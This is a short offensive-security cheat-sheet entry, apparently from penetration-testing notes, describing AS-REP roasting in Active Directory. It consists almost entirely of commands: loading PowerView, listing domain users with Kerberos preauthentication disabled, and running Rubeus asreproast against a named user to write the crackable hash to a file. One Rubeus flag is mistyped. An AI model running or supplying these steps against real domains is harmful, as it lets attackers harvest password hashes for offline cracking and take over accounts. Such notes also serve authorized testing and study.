## As-REP Roasting
- First Find User with Keberos No_Preauthentication ( DONT_REQ_PREAUTH )
```
. .\PowerView.ps1
```
```
Get-DomainUser | Where-Object { $_.useraccountcontrol -like "*DONT_REQ_PREAUTH"}
```
```
.\Rubeus.exe asreproast /usr:johnny /outfile:file.txt
```
